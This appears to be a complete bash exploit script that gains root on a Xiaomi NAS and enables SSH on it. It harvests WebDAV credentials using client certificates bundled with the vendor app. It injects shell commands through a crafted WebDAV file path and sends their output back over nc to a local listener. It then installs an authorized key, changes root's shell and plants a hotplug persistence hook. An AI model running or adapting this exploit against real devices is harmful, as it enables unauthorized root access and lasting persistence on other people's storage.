#!/usr/bin/env bash
set -euo pipefail

# Xiaomi NAS SSH enablement via certified WebDAV path injection.
# Usage: NAS_IP=<nas-ip> ./enable-xiaomi-nas-ssh.sh
# Secrets/IPs are kept local and not printed verbatim.

NAS_IP="${1:-${NAS_IP:-}}"
[[ -n "$NAS_IP" ]] || { echo "usage: NAS_IP=<nas-ip> $0  or  $0 <nas-ip>" >&2; exit 2; }

APP_NAME="${APP_NAME:-小米智能存储}"
CERT_DIR="${CERT_DIR:-/Applications/$APP_NAME.app/Contents/Resources/extraResources/cert}"
CURL="${CURL:-/opt/homebrew/opt/curl/bin/curl}"
KEY_PATH="${KEY_PATH:-/tmp/nas-root-key}"
CREDS_FILE="${CREDS_FILE:-/tmp/.wdav_creds}"
LISTENER="${LISTENER:-/tmp/nas_listener.py}"
LISTENER_OUT="${LISTENER_OUT:-/tmp/nas_listen_out.txt}"
LISTENER_PID="${LISTENER_PID:-/tmp/nas_listen.pid}"
WORK_IP="${WORK_IP:-$(route -n get "$NAS_IP" 2>/dev/null | awk '/source:/{print $2; exit}')}"
WORK_IP="${WORK_IP:-$(ipconfig getifaddr en0 2>/dev/null || ipconfig getifaddr en1 2>/dev/null || true)}"
[[ -n "$WORK_IP" ]] || { echo "Could not derive workstation IP" >&2; exit 3; }

step_no=0
step() { step_no=$((step_no+1)); printf '\n[%02d] %s\n' "$step_no" "$*"; }
ok() { printf '     OK: %s\n' "$*"; }
warn() { printf '     WARN: %s\n' "$*"; }
fail() { printf '     FAIL: %s\n' "$*" >&2; exit 1; }

redact() { sed -E "s/$NAS_IP/<NAS_IP>/g; s/$WORK_IP/<WORK_IP>/g"; }

[[ -x "$CURL" ]] || CURL="$(command -v curl)"

step "检查证书目录和 curl"
[[ -d "$CERT_DIR" ]] || fail "cert dir not found"
BASE="$(basename "$(ls "$CERT_DIR"/*_cert.pem 2>/dev/null | head -1)" _cert.pem)"
[[ -n "$BASE" && -f "$CERT_DIR/${BASE}_private_key.pem" && -f "$CERT_DIR/ca_chain.pem" ]] || fail "missing client cert/key/ca"
CLIENT_CERT="$CERT_DIR/${BASE}_cert.pem"
CLIENT_KEY="$CERT_DIR/${BASE}_private_key.pem"
CA_CERT="$CERT_DIR/ca_chain.pem"
CLIENT_CN="$(openssl x509 -in "$CLIENT_CERT" -noout -subject | sed -n 's/.*CN=//p' | awk '{print $1}')"
[[ -n "$CLIENT_CN" ]] || fail "cannot parse client CN"
SERVER_CN="$(printf '%s' "$CLIENT_CN" | sed -E 's/\.[0-9]+$/.0/')"
ok "certs found; identifiers redacted"

curl_cert_443() {
  "$CURL" -sS --connect-timeout 5 --max-time 15 \
    --cacert "$CA_CERT" --cert "$CLIENT_CERT" --key "$CLIENT_KEY" \
    --resolve "$SERVER_CN:443:$NAS_IP" "$@"
}

curl_cert_5000() {
  "$CURL" -sS --path-as-is --connect-timeout 5 --max-time 20 \
    --cacert "$CA_CERT" --cert "$CLIENT_CERT" --key "$CLIENT_KEY" \
    --resolve "$SERVER_CN:5000:$NAS_IP" "$@"
}

step "检查 NAS 端口连通性"
nc -z -G 2 "$NAS_IP" 443 >/dev/null 2>&1 || fail "443 not reachable"
nc -z -G 2 "$NAS_IP" 5000 >/dev/null 2>&1 || fail "5000 not reachable"
if nc -z -G 2 "$NAS_IP" 22 >/dev/null 2>&1; then warn "SSH already appears open"; else ok "443/5000 reachable; SSH not open yet"; fi

step "获取/复用 WebDAV 凭据"
if [[ ! -s "$CREDS_FILE" ]]; then
  TMP_JSON="$(mktemp)"
  curl_cert_443 -H 'Content-Type: application/json' -d '{"selector":["webDAV"]}' \
    "https://$SERVER_CN/cgi-bin/luci/filemgr/get_pool_info" > "$TMP_JSON"
  python3 - "$TMP_JSON" "$CREDS_FILE" <<'PY'
import json,sys,os
j=json.load(open(sys.argv[1]))
if j.get('code')!=0: raise SystemExit(f"get_pool_info failed code={j.get('code')}")
w=j['data']['webDAV']
open(sys.argv[2],'w').write(w['username']+':'+w['password'])
os.chmod(sys.argv[2],0o600)
print(w['username'])
PY
  USERNAME="$(cut -d: -f1 "$CREDS_FILE")"
  rm -f "$TMP_JSON"
else
  chmod 600 "$CREDS_FILE"
  USERNAME="$(cut -d: -f1 "$CREDS_FILE")"
fi
[[ -n "$USERNAME" ]] || fail "empty WebDAV username"
ok "WebDAV credentials ready in $CREDS_FILE (password not printed)"

step "验证 WebDAV 上传"
echo "hi" > /tmp/nas-ssh-test.txt
HTTP_CODE="$(curl_cert_5000 -u "$(cat "$CREDS_FILE")" -T /tmp/nas-ssh-test.txt \
  "https://$SERVER_CN:5000/pool0/data/nas-ssh-test.txt" -w '%{http_code}' -o /dev/null)"
[[ "$HTTP_CODE" == "204" || "$HTTP_CODE" == "201" ]] || fail "WebDAV PUT failed: HTTP $HTTP_CODE"
ok "WebDAV PUT success"

step "准备本机监听器"
cat > "$LISTENER" <<'PY'
import socket, sys
s=socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0',8124)); s.listen(1); s.settimeout(45)
print('LISTEN 0.0.0.0:8124', flush=True)
try:
    c,a=s.accept(); print('FROM <NAS>', flush=True); c.settimeout(3); chunks=[]
    while True:
        try: d=c.recv(65535)
        except socket.timeout: break
        if not d: break
        chunks.append(d)
    sys.stdout.buffer.write(b''.join(chunks)); sys.stdout.flush()
finally:
    s.close()
PY
ok "listener template ready"

start_listener() {
  kill "$(cat "$LISTENER_PID" 2>/dev/null)" 2>/dev/null || true
  sleep 0.5
  nohup python3 "$LISTENER" > "$LISTENER_OUT" 2>&1 &
  echo $! > "$LISTENER_PID"
  sleep 0.8
}

urlenc() { python3 -c 'import sys,urllib.parse; print(urllib.parse.quote(sys.argv[1], safe=""))' "$1"; }
remote_path_expr() {
  python3 -c 'import sys; print("$(printf " + repr(sys.argv[1].replace("/","\\\\057")) + ")")' "$1"
}

inject() {
  local cmd="$1"
  local enc; enc="$(urlenc "$cmd")"
  local p="/pool0/video/__x%22%3B${enc}%3B%22__.ts"
  curl_cert_5000 -u "$(cat "$CREDS_FILE")" -o /dev/null --max-time 20 -g "https://$SERVER_CN:5000$p" || true
}

sq() { printf "%s" "$1" | sed "s/'/'\\''/g"; }

inject_capture() {
  local cmd="$1"
  local quoted
  quoted="$(sq "$cmd")"
  start_listener
  inject "sh -c '$quoted' 2>&1 | nc $WORK_IP 8124"
  sleep 2
  cat "$LISTENER_OUT" | redact
}

step "验证注入通道延迟"
START=$(python3 - <<'PY'
import time; print(time.time())
PY
)
inject "sleep 3"
END=$(python3 - <<'PY'
import time; print(time.time())
PY
)
ELAPSED=$(python3 - <<PY
print(round($END-$START, 1))
PY
)
ok "sleep injection elapsed ${ELAPSED}s"

step "验证 NAS 侧 root 执行"
OUT="$(inject_capture 'id; echo SHELL=$SHELL')"
printf '%s\n' "$OUT"
printf '%s' "$OUT" | grep -q 'uid=0(root)' || fail "root id not observed"
ok "root command execution confirmed"

step "生成/复用 SSH 密钥"
if [[ ! -f "$KEY_PATH" ]]; then
  ssh-keygen -t ed25519 -f "$KEY_PATH" -N '' -C "nas-root-$(date +%F)" >/dev/null
fi
chmod 600 "$KEY_PATH"
[[ -f "$KEY_PATH.pub" ]] || fail "missing public key"
ok "SSH key ready at $KEY_PATH (private key not printed)"

step "创建 WebDAV Docker 目录并上传公钥/脚本"
curl_cert_5000 -u "$(cat "$CREDS_FILE")" -X MKCOL "https://$SERVER_CN:5000/pool0/data/Docker/" -o /dev/null || true
curl_cert_5000 -u "$(cat "$CREDS_FILE")" -T "$KEY_PATH.pub" "https://$SERVER_CN:5000/pool0/data/Docker/authorized_keys" -o /dev/null
cat > /tmp/setkey.sh <<SH
#!/bin/sh
install -d -m 700 /etc/dropbear
install -m 600 /home/$USERNAME/pool0/data/Docker/authorized_keys /etc/dropbear/authorized_keys
echo KEY_OK
SH
cat > /tmp/setshell.sh <<'SH'
#!/bin/sh
mkdir -p /runtime 2>/dev/null || true
cp /etc/passwd /runtime/passwd.bak-pre-ssh 2>/dev/null || cp /etc/passwd /tmp/passwd.bak-pre-ssh 2>/dev/null || true
usermod -s /bin/sh root
echo SHELL_OK
SH
cat > /tmp/setpersist.sh <<'SH'
#!/bin/sh
set -eu
HOOK=/etc/syshotplug/pool/98.ssh-persistence
mkdir -p /etc/syshotplug/pool
cat > "$HOOK" <<'EOF'
#!/bin/sh

[ "mounted" = "$ACTION" ] || exit 0
systemctl start dropbear.socket
logger -t ssh.persistence "dropbear.socket started after pool mount"
EOF
chmod 755 "$HOOK"
test -x /data/etc/upper/syshotplug/pool/98.ssh-persistence
echo PERSIST_HOOK_OK
SH
curl_cert_5000 -u "$(cat "$CREDS_FILE")" -T /tmp/setkey.sh "https://$SERVER_CN:5000/pool0/data/Docker/setkey.sh" -o /dev/null
curl_cert_5000 -u "$(cat "$CREDS_FILE")" -T /tmp/setshell.sh "https://$SERVER_CN:5000/pool0/data/Docker/setshell.sh" -o /dev/null
curl_cert_5000 -u "$(cat "$CREDS_FILE")" -T /tmp/setpersist.sh "https://$SERVER_CN:5000/pool0/data/Docker/setpersist.sh" -o /dev/null
ok "public key and scripts uploaded"

step "写入 dropbear authorized_keys"
SETKEY_EXPR="$(remote_path_expr "/home/$USERNAME/pool0/data/Docker/setkey.sh")"
OUT="$(inject_capture "sh $SETKEY_EXPR")"
printf '%s\n' "$OUT"
printf '%s' "$OUT" | grep -q 'KEY_OK' || fail "KEY_OK not observed"
ok "authorized_keys installed"

step "修改 root shell 为 /bin/sh"
SETSHELL_EXPR="$(remote_path_expr "/home/$USERNAME/pool0/data/Docker/setshell.sh")"
OUT="$(inject_capture "sh $SETSHELL_EXPR")"
printf '%s\n' "$OUT"
printf '%s' "$OUT" | grep -q 'SHELL_OK' || fail "SHELL_OK not observed"
ok "root shell updated; /etc/passwd backup created on NAS"

step "安装普通重启 SSH 持久化 hook"
SETPERSIST_EXPR="$(remote_path_expr "/home/$USERNAME/pool0/data/Docker/setpersist.sh")"
OUT="$(inject_capture "sh $SETPERSIST_EXPR")"
printf '%s\n' "$OUT"
printf '%s' "$OUT" | grep -q 'PERSIST_HOOK_OK' || fail "persistence hook was not installed in /data/etc/upper"
ok "pool-mounted hook installed in persistent /etc overlay"

step "启用 dropbear SSH 服务"
inject "systemctl start dropbear.socket"
sleep 2
if nc -z -G 3 "$NAS_IP" 22 >/dev/null 2>&1; then ok "SSH port is open"; else warn "SSH port not open yet; trying direct systemctl start"; inject "systemctl start dropbear.socket"; sleep 2; fi
nc -z -G 3 "$NAS_IP" 22 >/dev/null 2>&1 || fail "SSH port still not open"

step "验证 root SSH 登录"
SSH_OUT="$(ssh -i "$KEY_PATH" -o BatchMode=yes -o StrictHostKeyChecking=accept-new -o ConnectTimeout=8 root@"$NAS_IP" id 2>&1 | redact)" || { printf '%s\n' "$SSH_OUT"; fail "ssh id failed"; }
printf '%s\n' "$SSH_OUT"
printf '%s' "$SSH_OUT" | grep -q 'uid=0(root)' || fail "SSH did not return root id"
ok "SSH root is available"

step "验证持久化文件"
PERSIST_OUT="$(ssh -i "$KEY_PATH" -o BatchMode=yes -o ConnectTimeout=8 root@"$NAS_IP" \
  'test -x /etc/syshotplug/pool/98.ssh-persistence && test -x /data/etc/upper/syshotplug/pool/98.ssh-persistence && echo PERSIST_FILES_OK' 2>&1 | redact)" || { printf '%s\n' "$PERSIST_OUT"; fail "persistent hook verification failed"; }
printf '%s\n' "$PERSIST_OUT"
printf '%s' "$PERSIST_OUT" | grep -q 'PERSIST_FILES_OK' || fail "persistent hook files not observed"
ok "reboot hook is present; whole-device reboot is still required for end-to-end verification"

step "写入本机 SSH config 别名"
mkdir -p "$HOME/.ssh"
chmod 700 "$HOME/.ssh"
LOCAL_KEY="$HOME/.ssh/id_ed25519_xiaomi_nas"
if [[ "$KEY_PATH" != "$LOCAL_KEY" ]]; then
  cp "$KEY_PATH" "$LOCAL_KEY"
  [[ -f "$KEY_PATH.pub" ]] && cp "$KEY_PATH.pub" "$LOCAL_KEY.pub" || true
fi
chmod 600 "$LOCAL_KEY"
[[ -f "$LOCAL_KEY.pub" ]] && chmod 644 "$LOCAL_KEY.pub"
python3 - "$NAS_IP" <<'PY'
from pathlib import Path
import sys
nas_ip=sys.argv[1]
cfg=Path.home()/'.ssh/config'
text=cfg.read_text() if cfg.exists() else ''
block=f'''
# Xiaomi NAS root SSH
Host xiaomi-nas minas
    HostName {nas_ip}
    User root
    IdentityFile ~/.ssh/id_ed25519_xiaomi_nas
    IdentitiesOnly yes
    StrictHostKeyChecking accept-new
    ConnectTimeout 8
'''
lines=text.splitlines(); out=[]; i=0
while i < len(lines):
    if lines[i].strip() == '# Xiaomi NAS root SSH':
        i += 1
        while i < len(lines) and not (lines[i].startswith('Host ') or lines[i].startswith('# ')):
            i += 1
        continue
    out.append(lines[i]); i += 1
cfg.write_text('\n'.join(out).rstrip()+block+'\n')
PY
chmod 600 "$HOME/.ssh/config"
CONFIG_TEST="$(ssh -F "$HOME/.ssh/config" -o BatchMode=yes xiaomi-nas id 2>&1 | redact)" || { printf '%s\n' "$CONFIG_TEST"; fail "ssh config alias test failed"; }
printf '%s\n' "$CONFIG_TEST"
ok "SSH alias ready: ssh xiaomi-nas"

step "完成"
ok "Keep private key: $LOCAL_KEY"
ok "Keep WebDAV creds local: $CREDS_FILE"
warn "RPMB ssh_en is not set; reboot persistence relies on /etc/syshotplug/pool/98.ssh-persistence"
